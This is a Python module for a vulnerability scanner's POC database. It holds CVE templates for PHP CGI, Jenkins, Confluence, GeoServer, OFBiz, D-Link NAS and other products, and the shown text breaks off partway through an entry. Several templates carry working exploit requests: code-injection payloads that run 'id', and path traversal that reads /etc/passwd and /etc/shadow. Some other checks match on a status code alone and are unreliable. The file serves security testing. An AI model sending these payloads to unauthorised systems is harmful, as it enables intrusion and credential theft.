"""
Vulnerability POC Database
Comprehensive CVE/CNVD vulnerability signatures with detection logic
Inspired by nuclei templates and xray POC structure
"""
import re
import threading
from collections import OrderedDict
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from enum import Enum

from app.utils.logger import get_logger

logger = get_logger("poc_db")


class RiskLevel(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class POCType(str, Enum):
    HTTP = "http"
    DNS = "dns"
    TCP = "tcp"
    WEBSOCKET = "websocket"


class MatcherType(str, Enum):
    WORD = "word"
    REGEX = "regex"
    STATUS = "status"
    SIZE = "size"
    BINARY = "binary"
    DSL = "dsl"
    HEADER = "header"
    TIME = "time"
    HASH = "hash"


class MatcherCondition(str, Enum):
    AND = "and"
    OR = "or"


class ExtractorType(str, Enum):
    REGEX = "regex"
    JSON = "json"
    XPATH = "xpath"
    HEADER = "header"
    COOKIE = "cookie"


@dataclass
class Extractor:
    type: ExtractorType
    name: str
    value: str
    part: str = "body"
    _compiled_regex: Any = field(default=None, repr=False, init=False)

    def __post_init__(self):
        if self.type == ExtractorType.REGEX:
            try:
                self._compiled_regex = re.compile(self.value, re.IGNORECASE | re.DOTALL)
            except re.error:
                self._compiled_regex = None

    def extract(self, response: Any) -> Optional[str]:
        try:
            if self.type == ExtractorType.REGEX:
                if self._compiled_regex is None:
                    return None
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                match = self._compiled_regex.search(text)
                return match.group(1) if match and match.groups() else (match.group(0) if match else None)
            elif self.type == ExtractorType.HEADER:
                headers = getattr(response, "headers", {}) or {}
                return headers.get(self.value, None)
            elif self.type == ExtractorType.COOKIE:
                cookies = getattr(response, "cookies", {}) or {}
                return cookies.get(self.value, None)
            elif self.type == ExtractorType.JSON:
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                try:
                    import json
                    data = json.loads(text)
                    for key in self.value.split("."):
                        if isinstance(data, dict):
                            data = data.get(key)
                        elif isinstance(data, list) and key.isdigit():
                            data = data[int(key)] if int(key) < len(data) else None
                        else:
                            return None
                    return str(data) if data is not None else None
                except Exception:
                    return None
        except Exception:
            return None


@dataclass
class Matcher:
    type: MatcherType
    value: Any
    part: str = "body"
    condition: str = "and"
    negative: bool = False
    _compiled_regex: Any = field(default=None, repr=False, init=False)

    def __post_init__(self):
        if self.type == MatcherType.REGEX:
            try:
                self._compiled_regex = re.compile(self.value, re.IGNORECASE | re.DOTALL)
            except re.error:
                self._compiled_regex = None

    def match(self, response: Any) -> bool:
        try:
            if self.type == MatcherType.STATUS:
                result = response.status == self.value
            elif self.type == MatcherType.WORD:
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                result = str(self.value) in text
            elif self.type == MatcherType.REGEX:
                if self._compiled_regex is None:
                    return False
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                result = bool(self._compiled_regex.search(text))
            elif self.type == MatcherType.SIZE:
                body = getattr(response, "body", b"") or b""
                result = len(body) == self.value
            elif self.type == MatcherType.HEADER:
                headers = getattr(response, "headers", {}) or {}
                header_value = headers.get(self.part, "")
                if isinstance(self.value, str):
                    result = self.value in str(header_value)
                else:
                    result = header_value == self.value
            elif self.type == MatcherType.TIME:
                elapsed = getattr(response, "elapsed", 0) or 0
                result = elapsed >= self.value
            elif self.type == MatcherType.HASH:
                import hashlib
                body = getattr(response, "body", b"") or b""
                if isinstance(body, str):
                    body = body.encode("utf-8")
                computed = hashlib.md5(body).hexdigest()
                result = computed == self.value
            else:
                result = False

            return not result if self.negative else result
        except Exception:
            return False


@dataclass
class MatcherGroup:
    matchers: List[Matcher] = field(default_factory=list)
    condition: MatcherCondition = MatcherCondition.AND
    negative: bool = False

    def match(self, response: Any) -> bool:
        if not self.matchers:
            return False
        results = [m.match(response) for m in self.matchers]
        if self.condition == MatcherCondition.AND:
            result = all(results)
        else:
            result = any(results)
        return not result if self.negative else result


@dataclass
class POCRequest:
    method: str = "GET"
    path: str = "/"
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    raw: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "method": self.method,
            "path": self.path,
            "headers": self.headers,
            "body": self.body,
        }


@dataclass
class POC:
    id: str
    name: str
    description: str
    risk_level: RiskLevel
    cve_ids: List[str] = field(default_factory=list)
    cnvd_ids: List[str] = field(default_factory=list)
    cvss_score: float = 0.0
    tags: List[str] = field(default_factory=list)
    affected_versions: List[str] = field(default_factory=list)
    poc_type: POCType = POCType.HTTP
    requests: List[POCRequest] = field(default_factory=list)
    matchers: List[Matcher] = field(default_factory=list)
    matcher_groups: List[MatcherGroup] = field(default_factory=list)
    matchers_condition: MatcherCondition = MatcherCondition.AND
    extractors: List[Extractor] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    fix_suggestion: str = ""
    disclosure_date: str = ""

    def match(self, response: Any) -> bool:
        if self.matcher_groups:
            group_results = [g.match(response) for g in self.matcher_groups]
            if self.matchers_condition == MatcherCondition.AND:
                return all(group_results)
            else:
                return any(group_results)

        if not self.matchers:
            return False
        results = [m.match(response) for m in self.matchers]
        if self.matchers_condition == MatcherCondition.AND:
            return all(results)
        else:
            return any(results)

    def extract(self, response: Any) -> Dict[str, str]:
        extracted = {}
        for extractor in self.extractors:
            value = extractor.extract(response)
            if value is not None:
                extracted[extractor.name] = value
        return extracted

    def interpolate(self, template: str, variables: Dict[str, str]) -> str:
        result = template
        for name, value in variables.items():
            result = result.replace(f"{{{{{name}}}}}", value)
        return result

    def get_requests(self, variables: Optional[Dict[str, str]] = None) -> List[POCRequest]:
        if not variables:
            return list(self.requests)
        interpolated = []
        for req in self.requests:
            new_req = POCRequest(
                method=req.method,
                path=self.interpolate(req.path, variables),
                headers={k: self.interpolate(v, variables) for k, v in req.headers.items()},
                body=self.interpolate(req.body, variables) if req.body else None,
            )
            interpolated.append(new_req)
        return interpolated


POC_DATABASE: Dict[str, POC] = {}
_tag_index: Dict[str, Set[str]] = {}
_cve_index: Dict[str, Set[str]] = {}
_risk_index: Dict[RiskLevel, Set[str]] = {}
_index_lock = threading.RLock()
_index_built = False


class LRUCache:
    def __init__(self, max_size: int = 512):
        self._cache: OrderedDict = OrderedDict()
        self._max_size = max_size
        self._lock = threading.Lock()

    def get(self, key: str) -> Optional[Any]:
        with self._lock:
            if key in self._cache:
                self._cache.move_to_end(key)
                return self._cache[key]
            return None

    def put(self, key: str, value: Any):
        with self._lock:
            if key in self._cache:
                self._cache.move_to_end(key)
            self._cache[key] = value
            while len(self._cache) > self._max_size:
                self._cache.popitem(last=False)

    def clear(self):
        with self._lock:
            self._cache.clear()

    def __len__(self) -> int:
        return len(self._cache)


_poc_lookup_cache = LRUCache(max_size=1024)
_match_result_cache = LRUCache(max_size=2048)


def _build_indexes():
    global _index_built
    with _index_lock:
        if _index_built:
            return
        _tag_index.clear()
        _cve_index.clear()
        _risk_index.clear()
        for poc_id, poc in POC_DATABASE.items():
            for tag in poc.tags:
                _tag_index.setdefault(tag, set()).add(poc_id)
            for cve in poc.cve_ids:
                _cve_index.setdefault(cve, set()).add(poc_id)
            _risk_index.setdefault(poc.risk_level, set()).add(poc_id)
        _index_built = True
        logger.info(f"POC indexes built: {len(_tag_index)} tags, {len(_cve_index)} CVEs, {len(_risk_index)} risk levels")


def _invalidate_indexes():
    global _index_built
    with _index_lock:
        _index_built = False
        _poc_lookup_cache.clear()
        _match_result_cache.clear()


def register_poc(poc: POC):
    POC_DATABASE[poc.id] = poc
    _invalidate_indexes()


def get_poc(poc_id: str) -> Optional[POC]:
    cached = _poc_lookup_cache.get(f"poc:{poc_id}")
    if cached is not None:
        return cached
    poc = POC_DATABASE.get(poc_id)
    if poc:
        _poc_lookup_cache.put(f"poc:{poc_id}", poc)
    return poc


def get_pocs_by_tag(tag: str) -> List[POC]:
    cached = _poc_lookup_cache.get(f"tag:{tag}")
    if cached is not None:
        return cached
    if not _index_built:
        _build_indexes()
    poc_ids = _tag_index.get(tag, set())
    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
    _poc_lookup_cache.put(f"tag:{tag}", result)
    return result


def get_pocs_by_cve(cve_id: str) -> List[POC]:
    cached = _poc_lookup_cache.get(f"cve:{cve_id}")
    if cached is not None:
        return cached
    if not _index_built:
        _build_indexes()
    poc_ids = _cve_index.get(cve_id, set())
    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
    _poc_lookup_cache.put(f"cve:{cve_id}", result)
    return result


def get_pocs_by_risk(level: RiskLevel) -> List[POC]:
    cached = _poc_lookup_cache.get(f"risk:{level.value}")
    if cached is not None:
        return cached
    if not _index_built:
        _build_indexes()
    poc_ids = _risk_index.get(level, set())
    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
    _poc_lookup_cache.put(f"risk:{level.value}", result)
    return result


def get_pocs_by_tags(tags: List[str], match_all: bool = False) -> List[POC]:
    cache_key = f"tags:{','.join(sorted(tags))}:{match_all}"
    cached = _poc_lookup_cache.get(cache_key)
    if cached is not None:
        return cached
    if not _index_built:
        _build_indexes()
    if not tags:
        return []
    if match_all:
        result_sets = [_tag_index.get(t, set()) for t in tags]
        poc_ids = result_sets[0].intersection(*result_sets[1:]) if result_sets else set()
    else:
        poc_ids = set()
        for t in tags:
            poc_ids.update(_tag_index.get(t, set()))
    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
    _poc_lookup_cache.put(cache_key, result)
    return result


def get_all_pocs() -> List[POC]:
    return list(POC_DATABASE.values())


def match_poc_cached(poc_id: str, response: Any) -> bool:
    resp_hash = hash(str(response.status) + str(getattr(response, 'body', b'')[:512]))
    cache_key = f"match:{poc_id}:{resp_hash}"
    cached = _match_result_cache.get(cache_key)
    if cached is not None:
        return cached
    poc = get_poc(poc_id)
    if poc is None:
        return False
    result = poc.match(response)
    _match_result_cache.put(cache_key, result)
    return result


def get_poc_count() -> int:
    return len(POC_DATABASE)


def get_index_stats() -> dict:
    return {
        "total_pocs": len(POC_DATABASE),
        "tags_indexed": len(_tag_index),
        "cves_indexed": len(_cve_index),
        "risk_levels_indexed": len(_risk_index),
        "lookup_cache_size": len(_poc_lookup_cache),
        "match_cache_size": len(_match_result_cache),
    }


def _init_poc_database():
    try:
        from app.core.poc_db_extra import _init_extra_pocs
        _init_extra_pocs()
        logger.info("Extra POC signatures loaded successfully")
    except Exception as e:
        logger.warning(f"Failed to load extra POC signatures: {e}")
    pocs = [

        POC(
            id="cve-2024-4577",
            name="PHP CGI 参数注入导致远程代码执行 (CVE-2024-4577)",
            description="PHP在Windows平台使用CGI模式时，对字符编码处理不当，攻击者可通过特定字符绕过防护，注入参数实现远程代码执行。影响所有PHP 8.x版本在Windows + CGI模式下的部署。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-4577"],
            cvss_score=9.8,
            tags=["php", "rce", "cgi", "windows", "cve-2024"],
            affected_versions=["PHP 8.3.0 - 8.3.7", "PHP 8.2.0 - 8.2.19", "PHP 8.1.0 - 8.1.28"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="<?php echo md5('CVE-2024-4577'); ?>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="b8d799861fc1a2b2c29e5e5e3c8b3e6e"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
                "https://blog.orange.tw/posts/2024-06-11-cve-2024-4577/",
            ],
            fix_suggestion="升级PHP至8.3.8/8.2.20/8.1.29或更高版本，或避免在Windows上使用CGI模式部署PHP。",
            disclosure_date="2024-06-09",
        ),

        POC(
            id="cve-2024-23897",
            name="Jenkins CLI 任意文件读取漏洞 (CVE-2024-23897)",
            description="Jenkins CLI命令解析器存在缺陷，攻击者可通过@字符读取服务器上的任意文件，导致敏感信息泄露。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-23897"],
            cvss_score=7.5,
            tags=["jenkins", "lfi", "file-read", "cve-2024"],
            affected_versions=["Jenkins <= 2.441", "Jenkins LTS <= 2.426.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cli?remoting=false",
                    headers={
                        "Session": "?",
                        "Side": "download",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    body="\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e@/etc/passwd\x00\x00\x00\x00",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-23897",
            ],
            fix_suggestion="升级Jenkins至2.442或LTS 2.426.3及以上版本。",
            disclosure_date="2024-01-24",
        ),

        POC(
            id="cve-2024-27198",
            name="JetBrains TeamCity 认证绕过漏洞 (CVE-2024-27198)",
            description="TeamCity Web组件中存在认证绕过漏洞，攻击者可通过特定路径直接访问管理功能，创建管理员账户或执行任意代码。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-27198"],
            cvss_score=9.8,
            tags=["teamcity", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["TeamCity < 2023.11.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/hax?jsp=/app/rest/users/;.jsp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="user"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-27198",
            ],
            fix_suggestion="升级TeamCity至2023.11.4或更高版本。",
            disclosure_date="2024-03-04",
        ),

        POC(
            id="cve-2024-21762",
            name="FortiOS SSL VPN 越界写入漏洞 (CVE-2024-21762)",
            description="FortiOS SSL VPN组件存在越界写入漏洞，未认证攻击者可通过特制HTTP请求实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-21762"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "ssl-vpn", "rce", "cve-2024"],
            affected_versions=["FortiOS 7.4.0 - 7.4.2", "FortiOS 7.2.0 - 7.2.6", "FortiOS 7.0.0 - 7.0.13"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
                Matcher(type=MatcherType.WORD, value="fgt_lang"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-21762",
            ],
            fix_suggestion="升级FortiOS至7.4.3/7.2.7/7.0.14或更高版本。",
            disclosure_date="2024-02-08",
        ),

        POC(
            id="cve-2024-4040",
            name="CrushFTP 服务器端模板注入漏洞 (CVE-2024-4040)",
            description="CrushFTP VFS沙箱逃逸漏洞，攻击者可通过SSTI注入实现任意文件读取和远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-4040"],
            cvss_score=9.8,
            tags=["crushftp", "ssti", "rce", "cve-2024"],
            affected_versions=["CrushFTP < 11.1.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/WebInterface/function/?c2f={user_name}&command=zip&path={{working_dir}}&names=*",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4040",
            ],
            fix_suggestion="升级CrushFTP至11.1.0或更高版本。",
            disclosure_date="2024-04-19",
        ),

        POC(
            id="cve-2023-50164",
            name="Apache Struts2 文件上传远程代码执行漏洞 (CVE-2023-50164)",
            description="Struts2文件上传逻辑存在缺陷，攻击者可通过操纵文件上传参数实现路径遍历和远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-50164"],
            cvss_score=9.8,
            tags=["struts2", "file-upload", "rce", "cve-2023"],
            affected_versions=["Struts 2.0.0 - 2.3.37", "Struts 2.5.0 - 2.5.32", "Struts 6.0.0 - 6.3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/struts2-showcase/fileUpload.action",
                    headers={"Content-Type": "multipart/form-data"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="struts"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-50164",
            ],
            fix_suggestion="升级Struts2至2.5.33或6.3.0.2及以上版本。",
            disclosure_date="2023-12-07",
        ),

        POC(
            id="cve-2023-46604",
            name="Apache ActiveMQ 远程代码执行漏洞 (CVE-2023-46604)",
            description="ActiveMQ OpenWire协议存在反序列化漏洞，攻击者可通过发送特制序列化对象实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-46604"],
            cvss_score=10.0,
            tags=["activemq", "deserialization", "rce", "cve-2023"],
            affected_versions=["ActiveMQ < 5.15.16", "ActiveMQ < 5.16.7", "ActiveMQ < 5.17.6", "ActiveMQ < 5.18.3"],
            poc_type=POCType.TCP,
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="ActiveMQ"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-46604",
            ],
            fix_suggestion="升级ActiveMQ至5.15.16/5.16.7/5.17.6/5.18.3或更高版本。",
            disclosure_date="2023-10-25",
        ),

        POC(
            id="cve-2023-22527",
            name="Atlassian Confluence 模板注入远程代码执行漏洞 (CVE-2023-22527)",
            description="Confluence Data Center和Server存在OGNL模板注入漏洞，未认证攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-22527"],
            cvss_score=10.0,
            tags=["confluence", "ssti", "ognl", "rce", "cve-2023"],
            affected_versions=["Confluence Data Center 8.0 - 8.5.3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/template/aui/text-inline.vm",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="label=test\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'id'}))",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="X-Cmd-Response"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-22527",
            ],
            fix_suggestion="升级Confluence至8.5.4或更高版本。",
            disclosure_date="2024-01-16",
        ),

        POC(
            id="cve-2023-34039",
            name="VMware Aria Operations for Networks 远程代码执行漏洞 (CVE-2023-34039)",
            description="VMware Aria Operations for Networks存在认证绕过和命令注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-34039"],
            cvss_score=9.8,
            tags=["vmware", "aria", "rce", "auth-bypass", "cve-2023"],
            affected_versions=["VMware Aria Operations for Networks < 6.11.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/saas./resttosaasservice",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-34039",
            ],
            fix_suggestion="升级VMware Aria Operations for Networks至6.11.0或更高版本。",
            disclosure_date="2023-08-29",
        ),

        POC(
            id="cve-2024-24919",
            name="Check Point Security Gateway 信息泄露漏洞 (CVE-2024-24919)",
            description="Check Point Security Gateway存在路径遍历漏洞，攻击者可读取系统敏感文件，包括密码哈希等。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-24919"],
            cvss_score=8.6,
            tags=["checkpoint", "lfi", "info-disclosure", "cve-2024"],
            affected_versions=["Check Point Security Gateway R80 - R81"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/clients/MyCRL",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="aCSHELL/../../../../../../../etc/shadow",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:[$]"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-24919",
            ],
            fix_suggestion="联系Check Point获取安全补丁。",
            disclosure_date="2024-05-28",
        ),

        POC(
            id="cve-2024-3273",
            name="D-Link NAS 命令注入漏洞 (CVE-2024-3273)",
            description="D-Link多款NAS设备存在命令注入漏洞，攻击者可通过HTTP请求参数注入系统命令。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-3273"],
            cvss_score=9.8,
            tags=["dlink", "nas", "command-injection", "rce", "cve-2024"],
            affected_versions=["DNS-320L", "DNS-325", "DNS-327L", "DNS-340L"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=a;id;",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-3273",
            ],
            fix_suggestion="设备已EOL，建议更换设备或隔离网络访问。",
            disclosure_date="2024-04-04",
        ),

        POC(
            id="cve-2024-4956",
            name="Nexus Repository Manager 路径遍历漏洞 (CVE-2024-4956)",
            description="Sonatype Nexus Repository Manager存在路径遍历漏洞，攻击者可读取系统任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-4956"],
            cvss_score=7.5,
            tags=["nexus", "path-traversal", "lfi", "cve-2024"],
            affected_versions=["Nexus Repository Manager 3.0.0 - 3.67.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/repository/repo-name/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4956",
            ],
            fix_suggestion="升级Nexus Repository Manager至3.68.0或更高版本。",
            disclosure_date="2024-05-16",
        ),

        POC(
            id="cve-2024-36401",
            name="GeoServer 远程代码执行漏洞 (CVE-2024-36401)",
            description="GeoServer WFS/WMS服务存在JXPath表达式注入漏洞，攻击者可通过OGC请求参数实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-36401"],
            cvss_score=9.8,
            tags=["geoserver", "rce", "jxpath", "cve-2024"],
            affected_versions=["GeoServer < 2.23.6", "GeoServer < 2.24.4", "GeoServer < 2.25.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/geoserver/wfs",
                    headers={"Content-Type": "application/xml"},
                    body='''<wfs:GetPropertyValue service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0"
  xmlns:fes="http://www.opengis.net/fes/2.0"
  xmlns:gml="http://www.opengis.net/gml/3.2"
  valueReference="exec(java.lang.Runtime.getRuntime(),'id')">
  <wfs:Query typeNames="sf:archsites"/>
</wfs:GetPropertyValue>''',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-36401",
            ],
            fix_suggestion="升级GeoServer至2.23.6/2.24.4/2.25.2或更高版本。",
            disclosure_date="2024-07-01",
        ),

        POC(
            id="cve-2024-38856",
            name="Apache OFBiz 未授权远程代码执行漏洞 (CVE-2024-38856)",
            description="Apache OFBiz存在认证绕过漏洞，攻击者可通过特定端点实现未授权远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-38856"],
            cvss_score=9.8,
            tags=["ofbiz", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["Apache OFBiz < 18.12.15"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webtools/control/ProgramExport/?groovyProgram=throw+new+Exception('id'.execute().text);",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-38856",
            ],
            fix_suggestion="升级Apache OFBiz至18.12.15或更高版本。",
            disclosure_date="2024-08-05",
        ),

        POC(
            id="cve-2024-40711",
            name="Veeam Backup & Replication 远程代码执行漏洞 (CVE-2024-40711)",
            description="Veeam Backup & Replication存在反序列化漏洞，攻击者可通过特制请求实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-40711"],
            cvss_score=9.8,
            tags=["veeam", "deserialization", "rce", "cve-2024"],
            affected_versions=["Veeam Backup & Replication < 12.2.0.334"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/backupInfrastructure",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-40711",
            ],
            fix_suggestion="升级Veeam Backup & Replication至12.2.0.334或更高版本。",
            disclosure_date="2024-09-04",
        ),

        POC(
            id="cve-2024-47575",
            name="FortiManager 未授权远程代码执行漏洞 (CVE-2024-47575)",
            description="FortiManager存在关键功能认证缺失漏洞，攻击者可通过特制请求实现未授权远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-47575"],
            cvss_score=9.8,
            tags=["fortinet", "fortimanager", "rce", "auth-bypass", "cve-2024"],
            affected_versions=["FortiManager 7.6.0", "FortiManager 7.4.0 - 7.4.4", "FortiManager 7.2.0 - 7.2.7"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/fds/register",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-47575",
            ],
            fix_suggestion="升级FortiManager至7.6.1/7.4.5/7.2.8或更高版本。",
            disclosure_date="2024-10-23",
        ),

        POC(
            id="cve-2024-50623",
            name="Cleo Harmony/VLTrader 远程代码执行漏洞 (CVE-2024-50623)",
            description="Cleo文件传输软件存在未授权文件写入漏洞，攻击者可上传恶意文件实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-50623"],
            cvss_score=9.8,
            tags=["cleo", "file-upload", "rce", "cve-2024"],
            affected_versions=["Cleo Harmony < 5.8.0.21", "VLTrader < 5.8.0.21"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/Synchronization",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-50623",
            ],
            fix_suggestion="升级Cleo软件至5.8.0.21或更高版本。",
            disclosure_date="2024-12-09",
        ),

        POC(
            id="cve-2024-55591",
            name="FortiOS 认证绕过漏洞 (CVE-2024-55591)",
            description="FortiOS存在认证绕过漏洞，攻击者可通过WebSocket隧道获取超级管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-55591"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "auth-bypass", "cve-2024"],
            affected_versions=["FortiOS 7.0.0 - 7.0.16"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/ws/vpn/portal",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=101),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
            ],
            fix_suggestion="升级FortiOS至7.0.17或更高版本。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-24813",
            name="Apache Tomcat 路径等价漏洞导致RCE (CVE-2025-24813)",
            description="Apache Tomcat存在路径等价处理缺陷，结合特定条件可实现反序列化RCE和信息泄露。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-24813"],
            cvss_score=9.8,
            tags=["tomcat", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Tomcat 11.0.0-M1 - 11.0.2", "Apache Tomcat 10.1.0-M1 - 10.1.34", "Apache Tomcat 9.0.0-M1 - 9.0.98"],
            requests=[
                POCRequest(
                    method="PUT",
                    path="/session",
                    headers={"Content-Range": "bytes 0-5/6"},
                    body="deser:",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-24813",
            ],
            fix_suggestion="升级Tomcat至11.0.3/10.1.35/9.0.99或更高版本。",
            disclosure_date="2025-03-10",
        ),

        POC(
            id="cve-2025-30208",
            name="Vite 开发服务器任意文件读取漏洞 (CVE-2025-30208)",
            description="Vite开发服务器存在路径遍历漏洞，攻击者可通过特殊构造的URL读取服务器上的任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-30208"],
            cvss_score=7.5,
            tags=["vite", "path-traversal", "lfi", "cve-2025"],
            affected_versions=["Vite < 6.2.3", "Vite < 6.1.2", "Vite < 6.0.12", "Vite < 5.4.15", "Vite < 4.5.10"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/@fs/etc/passwd?import&?inline=1.wasm?init",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-30208",
            ],
            fix_suggestion="升级Vite至最新安全版本。",
            disclosure_date="2025-03-25",
        ),

        POC(
            id="cve-2025-3248",
            name="Langflow 远程代码执行漏洞 (CVE-2025-3248)",
            description="Langflow存在代码注入漏洞，攻击者可通过API端点执行任意Python代码。",
            risk_level=RiskLevel.CRITICAL,
